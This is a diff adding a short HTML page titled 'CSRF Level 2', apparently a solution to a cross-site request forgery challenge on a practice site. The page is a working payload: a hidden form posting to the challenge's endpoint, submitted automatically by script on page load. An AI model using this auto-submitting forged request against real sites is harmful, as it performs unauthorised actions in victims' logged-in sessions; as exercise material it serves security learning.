@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="UTF-8">
+        <meta name="author" content="Kevin Ly">
+        <title>CSRF Level 2</title>
+    </head>
+
+    <body>
+        <form action="http://csrf-challenges.r7.io/make_post/2" id="bad_form" method="POST">
+            <input type="hidden" name="post" value="keivnly7@uw.edu">
+        </form>
+
+        <script>
+            document.getElementById("bad_form").submit();
+        </script>
+    </body>
+</html>
